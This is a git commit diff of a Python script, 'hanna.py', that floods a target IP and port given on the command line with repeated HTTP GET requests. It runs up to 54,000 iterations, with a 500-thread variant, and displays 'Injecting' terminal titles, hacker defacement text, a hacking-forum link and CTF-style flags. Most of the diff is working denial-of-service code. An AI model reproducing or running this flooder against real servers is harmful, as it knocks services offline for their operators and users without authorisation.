9611ac4294a2bf1f82348d6f0bff840e706bdf51
kwafelt <112316378+kwafelt@users.noreply.github.com>
2022-09-30 10:32:10 +0800

    Update hanna.py

--- hanna.py
+++ hanna.py
@@ -1,5 +1,24 @@
 #!/usr/bin/env python3
 #
+import datetime, os, platform, socket, sys, uuid
+import hashlib, json, requests, threading
+from threading import Timer
+import time
+# RAW
+
+hil = """
+GET / HTTP/1.1
+Host: 127.0.0.1:8080
+User-Agent: python-requests/2.22.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+>> Host, User-Agent, Accept, Accept-Encoding, Connection
+
+num = send(s, addr_of_data, len_of_data, 0);
+num = recv(s, addr_of_buffer, len_of_buffer, 0);
+Content-Type: text/plain
+"""
 hello = """
                                                                       
         .uef^"                                                        
@@ -17,26 +36,6 @@ hello = """
             @%                                                        
           :"                                                          
 """
-import datetime, os, platform, socket, sys, uuid
-import hashlib, json, requests, threading
-from threading import Timer
-
-import time
-# RAW
-
-hil = """
-GET / HTTP/1.1
-Host: 127.0.0.1:8080
-User-Agent: python-requests/2.22.0
-Accept-Encoding: gzip, deflate
-Accept: */*
-Connection: keep-alive
->> Host, User-Agent, Accept, Accept-Encoding, Connection
-
-num = send(s, addr_of_data, len_of_data, 0);
-num = recv(s, addr_of_buffer, len_of_buffer, 0);
-Content-Type: text/plain
-"""
 workstation = "Hanna Sofea's comrade";
 w1 = '\tLOCKED OUT OF SERVER; kwafeLt wAS hERE..'
 w2 = '\thttps://dragonforce.io/members/kwafelt.30011/'
@@ -48,24 +47,16 @@ user_agent = Browser_identification; ps4 = 'WorkaroundCtl/1.00 libhttp/9.60 (Pla
 localhost =  socket.gethostname(); address = socket.gethostbyname(localhost);
 hostname = os.uname()[0]; username = os.environ.get('USERNAME');
 admin = os.getlogin(); MAC = hex(uuid.getnode());
-deact = 'writ.er.ws'; slEEp = 0.5
+deact = 'writ.er.ws'; slEEp = 0.75;
 
 # parse_input
-script = sys.argv[0]; none = ""; txt = none;
-target = none; port = none; num_requests = 0;
+script = sys.argv[0]; txt = None;
+target = None; port = None; num_requests = 0;
 
-def t1m3r():
- Timer(0.5,parse).start();
 
-def parse():
- if (len(sys.argv) == 3):
-  global target; global port;
-  target = sys.argv[1]; port = sys.argv[2]; port = int(port);
-  start();
- else:
-  sys.stdout.write(f'\r\n Usage: {sys.argv[0]} < TARGET_IP > < PORT >');
-  sys.stdout.write(f'\r\n exmpl: {sys.argv[0]} 255.255.255.255 443\n');
-  sys.stdout.flush(); reset(0); sys.exit(0); return False;
+thread_num = 0
+# OK
+
 
 # scratch.py
 #
@@ -81,6 +72,9 @@ def test():
 def colored(r,g,b,text):
  return '\033[38;2;{};{};{}m{}\033[38;2;255;255;255m'.format(r,g,b,text);
 
+def rgb(r,g,b,text):
+ return '\033[38;2;{};{};{}m{}\033[38;2;255;255;255m'.format(r,g,b,text);
+
 def client(init): # platform
  client_os = platform.system(); un = platform.uname();
  client_hn = platform.node(); # hostname
@@ -93,7 +87,7 @@ confirm = 'Is this ok?';
 
 def terminal(init):
  if init == 'start': terminal_title = workstation + ' \ ' + v4L
- if init == 'process': terminal_title = 'Injecting \ ' + target + ': ' + str(port) + ' \ ' + v4L
+ if init == 'process': terminal_title = 'Injecting process \ ' + target + ': ' + str(port) + ' \ ' + v4L
  print(f'\33]0;{terminal_title}\a',end='',flush=True);
 
 def h4sh(txt):
@@ -110,18 +104,36 @@ def address(LAN):
   wifi.connect((remote_server,80)) # 443
   addr = wifi.getsockname()[0]
  return addr
- 
+
+
+###############################################################################
+
+def t1m3r(init): Timer(init,parse).start();
 def reset(init):
  os.system('setterm --foreground default --background default --cursor on');
- if init == 1:
-  sys.stdout.write(f'\r\n .. stopping python3 {script} {target} {port}\r\n');
-  sys.stdout.flush(); sys.stdout.write(f'\r\n .. T3R1M4 K4S3H ..\r\n\n');
+ if (init == 1):
+  sys.stdout.write(f'\r\n STOPPING python3 {script} {target} {port}\r\n');
+  sys.stdout.flush(); sys.stdout.write(f'\r\n T3R1M4 K4S3H ~\r\n\n');
   sys.stdout.flush(); sys.exit(1);
-
-def start():
+def parse(init):
+ if (len(sys.argv) == 3):
+  global target; global port;
+  target = sys.argv[1]; target = str(target); port = sys.argv[2];
+  port = int(port); verif(init);
+ else:
+  sys.stdout.write(f'\r\n Usage: {sys.argv[0]} < TARGET_IP > < PORT >');
+  sys.stdout.write(f'\r\n exmpl: {sys.argv[0]} 255.255.255.255 443\n');
+  sys.stdout.flush(); reset(0); sys.exit(0); return False;
+def verif(init):
+ try:
+  r = socket.gethostbyname(target); s = socket.create_connection((r, port), 2);
+  start(init);
+ except (IOError, OSError):
+  txt = 'SYSTEM LOCKDOWN / SERVER OFFLINE';
+  sys.stdout.write(f'\r\n {txt}\r\n'); sys.stdout.flush(); sys.exit(0);
+def start(init):
  terminal('start'); os.system('setterm --foreground black --background white --cursor on')
  os.system('clear'); print(hello); access_code('\taccess code');
-
 def access_code(key):
  reply = input('\n ' + key + '\t:\t');
  if reply == '2022':
@@ -134,23 +146,21 @@ def access_code(key):
   yes_or_no(question);
  else:
   access_code('\ttry again');
-
 def yes_or_no(question):
  reply = input('\n ' + question + ' [y/N] ');
  if reply == '' or reply[0] == 'n':
   global txt; txt = 'CANCEL'; reset(0); os.system('clear'); return False;
- if reply[0] == 'y': pre_start(); return False;
+ if reply[0] == 'y': press(0); return False;
  else: return yes_or_no('so.. YES or NO ?');
-
 def yes_or_no_ORIG(question): # BROKEN
  reply = str(raw_input(question + ' [y/N] ')).lower().strip();
  if reply[0] == 'y': return True
  if reply[0] == 'n': return False
  else: return yes_or_no("Uhhhh... please enter ");
-
-def pre_start():
- os.system('setterm --cursor off');#os.system('clear');
- terminal('process'); verify();
+def press(init):
+ tx1 = datetim4(0); os.system('setterm --cursor off'); os.system('clear');
+ tx2 = 'Injecting process..'; terminal('process');
+ st = print_status(); st.initial(tx1,tx2); process(24500);
 
 ###############################################################################
 
@@ -184,99 +194,95 @@ def datetim4(init):
  return strTIME
  return waktu
 
-thread_num = 0
-# OK
-def print_status(status, hexd):
- tim3 = datetim4(0)
- tim4 = datetim4(1)
- if status == 'success':
-  str_1 = colored(205, 163, 152, tim3)
-  str_2 = colored(45 , 145, 145, b4L)
-  str_3 = colored(245, 110,  45, hexd)
-  str_4 = colored(245, 245, 245, v4L)
-  slEEp = 1.0; sys.stdout.write(f'\r {str_1} {str_2} {str_3} {str_4}\r\n');
-  sys.stdout.flush(); return False;
- if status == 'failure':
-  str_1 = colored(145, 145, 145, tim3);
-  str_2 = colored(245, 110, 110, 'No connection > server may be down');
-  str_3 = colored(205, 163, 152, '< RECONNECTING');
-  str_4 = colored(245 , 245, 245, tim4);
-  sys.stdout.write(f'\r\n {str_1} {str_2} {str_3} {str_4}\r');
-  sys.stdout.flush();
- else:
-  str_1 = colored(245,110,45,tim3);
-  str_2 = colored(245,245,245,'!PAUSED');
-  str_3 = colored(245,45,215,'You pressed CTRL + C / Program interrupted.');
-  sys.stdout.write(f'\r\n {str_1} {str_2} {str_3}\r\n'); sys.stdout.flush();
-  reset(0);
- return status
-
+class print_status():
+ def initial(self, time, txt1):
+  tx1 = rgb(245,245,245,time); tx2 = rgb(255,215,0,txt1);
+  sys.stdout.write(f'\r {tx1} {tx2}\r'); sys.stdout.flush();
+ def success(self, time, txt1):
+  tx1 = rgb(205, 163, 152, time);
+  tx2 = rgb(45 , 145, 145, 'Success');
+  tx3 = rgb(245, 110,  45, txt1);
+  tx4 = rgb(245, 245, 245, v4L);
+  sys.stdout.write(f'\r\n {tx1} {tx2} {tx3} {tx4}\r'); sys.stdout.flush();
+ def timeout(self, time, txt1):
+  tx1 = rgb(245,245,245,time);
+  tx2 = rgb(255,215,0,'Timeout');
+  tx3 = '> ERR_CONNECTION_TIMEOUT_ERR';
+  tx4 = rgb(0,110,210,'< RECONNECTING');
+  sys.stdout.write(f'\r\n {tx1} {tx2} {tx3} {tx4}\r'); sys.stdout.flush();
+ def failure(self, time, txt1):
+  tx1 = rgb(145, 145, 145, time);
+  tx2 = rgb(245, 110, 110, 'Failure');
+  tx3 = rgb(255, 215, 0, 'No connection > server may be down');
+  tx4 = rgb(245 , 245, 245, '< RECONNECTING');
+  sys.stdout.write(f'\r\n {tx1} {tx2} {tx3} {tx4}\r'); sys.stdout.flush();
+ flag = 'CTF{kwafeLt_wAS_hERE}';
 ###############################################################################
+class att4ck():
+ def default(self, txt, key):
+  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as proc:
+   try:
+    address = (target, port); proc.connect(address); proc.settimeout(1);# saat
+    proc.sendto((f'GET /?{hexd} HTTP/1.1\r\nHost: {deact}\r\n').encode('ascii'), address);
+    proc.sendto((f'User-Agent: {user_agent}\r\nAccept-Encoding: gzip, deflate\r\n').encode('ascii'), address);
+    proc.sendto((f'Accept: text/plain,*/*\r\nConnection: keep-alive\r\n').encode('ascii'), address);
+    proc.sendto((f'Keep-Alive: timeout=15, max=100\r\n\r\n').encode('ascii'), address);
+    #
+    #response = proc.recv(256); # 4096 #print('\r\n' + response.decode('ascii'))
+    #
+    proc.shutdown(socket.SHUT_RDWR); proc.close();
+   except:
+    pass
+
+
 
 def attack():
- global slEEp; status = 'IDLE'; t1m3 = datetim4(1); hexd = h4sh(t1m3);
+ global slEEp; time.sleep(slEEp); time1 = datetim4(0); time2 = datetim4(1); hexd = h4sh(time2);
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as proc:
   try:
-   address = (target, port); proc.connect(address);
-   proc.sendto(('GET /' + '?i=' + hexd + ' HTTP/1.1\r\nHost: ' + deact + '\r\n').encode('ascii'), address);
-   proc.sendto(('User-Agent: ' + user_agent + '\r\nAccept-Encoding: gzip, deflate\r\n').encode('ascii'), address);
-   proc.sendto(('Accept: text/plain,*/*\r\nConnection: keep-alive\r\n').encode('ascii'), address);
-   proc.sendto(('Keep-Alive: timeout=15, max=100\r\n\r\n').encode('ascii'), address);
+   address = (target, port); proc.connect(address); proc.settimeout(0.75);#saat
+   proc.sendto((f'GET /?{hexd} HTTP/1.1\r\nHost: {deact}\r\n').encode('ascii'), address);
+   proc.sendto((f'User-Agent: {user_agent}\r\nAccept-Encoding: gzip, deflate\r\n').encode('ascii'), address);
+   proc.sendto((f'Accept: text/plain,*/*\r\nConnection: keep-alive\r\n').encode('ascii'), address);
+   proc.sendto((f'Keep-Alive: timeout=15, max=100\r\n\r\n').encode('ascii'), address);
    #
-   # response = proc.recv(4096); #print('\r\n' + response.decode('ascii'))
-   #
-   proc.shutdown(socket.SHUT_RDWR); proc.close();
-   slEEp = 0.05; status = 'success'; # print_status('success', hexd);
-  except socket.error:
-   slEEp = 1.00; status = 'failure'; # print_status('failure', hexd);
-  except (IOError, OSError):
-   slEEp = 3.00; status = 'OSError'; hexd = 'dalam socket';
-  except (KeyboardInterrupt, SystemExit):
-   status = 'numb'; print('\r\n','..EXIT');
-  finally:
-   print_status(status, hexd);# Timer(slEEp,process).start();
-   #process();
+   #response = proc.recv(256); # 4096 #print('\r\n' + response.decode('ascii'))
    # num = send(s, addr_of_data, len_of_data, 0);
    # num = recv(s, addr_of_buffer, len_of_buffer, 0);
+   #
+   proc.shutdown(socket.SHUT_RDWR); proc.close();
+   slEEp = 0.02; st = print_status(); st.success(time1,hexd)
+  except socket.timeout:
+   slEEp = 0.50; st = print_status(); st.timeout(time1,None)
+  except socket.error:
+   slEEp = 1.00; st = print_status(); st.failure(time1,None)
+  except (KeyboardInterrupt, SystemExit): sys.exit(0);
+  finally: pass;
  return slEEp;
 
-def process():
- try:
-  for i in range(10):# 500
-   time.sleep(slEEp);
-   thread = threading.Thread(target=attack);
-   thread.start();
- except (IOError, OSError):
-  print('OSError');
- except (KeyboardInterrupt, SystemExit):
-  time.sleep(0.5); global txt; txt = '.. CTRL-C / PRESSED';
-  reset(0);
-
-def process_steady():
- i = 1;
- while (i < 540000):
-  process();# attack();
-  if (i == 3):
-   time.sleep(0.5)
-   global txt; txt = '.. FINN / CTF{h4nn4_s0f34}';
-   reset(0); break
+def process(i):
+ while (i < 54000):
   i += 1
+  if (i == 54000):
+   time.sleep(1.0); flag = 'CTF{5h371x1}';
+   tx1 = rgb(245,245,245,f'COMPLETED / ETA {i} / {flag} / FINN');
+   sys.stdout.write(f'\r\n\n {tx1}\r\n'); sys.stdout.flush(); break
+  else:
+   try: attack(); #Timer(slEEp,attack).start();
+   except (KeyboardInterrupt, SystemExit):
+    tx1 = rgb(245,245,245,'KEYBOARD INTERRUPT / CTRL-C / PRESSED / PAUSED');
+    sys.stdout.write(f'\r\n\n {tx1}\r\n'); sys.stdout.flush(); sys.exit(0);
+   finally: pass;
 
-def verify():
- try:
-  r = socket.gethostbyname(target);
-  s = socket.create_connection((r, port), 2)
-  process_steady();
- except (IOError, OSError):
-  global txt; txt = '.. SYSTEM LOCKDOWN / SERVER OFFLINE';
-  reset(0);
- except (KeyboardInterrupt, SystemExit):
-  reset(0);
-
+def process_B():
+ for i in range(500):# 500
+  time.sleep(slEEp); thread = threading.Thread(target=attack);
+  thread.start(); # ..D.O.R.M.A.N..
 ###############################################################################
-
-try: parse(); reset(0);
-except (IOError, OSError): print('main_OSError');
-except (KeyboardInterrupt, SystemExit): sys.stdout.write(f'\r\n {txt}\r\n'); sys.stdout.flush();
-finally: reset(1); sys.exit(0);
-# TERIMA KASEH~
+try: parse(0); txt = None;
+except (KeyboardInterrupt, IOError, OSError):
+ tx1 = rgb(245,245,245,'KEYBOARD INTERRUPT RECEIVED, EXITING / CLOSE ..');
+ sys.stdout.write(f'\n {tx1}\r\n'); sys.stdout.flush(); sys.exit(0);
+except SystemExit as EXIT: pass;
+finally: reset(1); sys.exit(1);
+##############################!TERIMA-KASEH~###################################
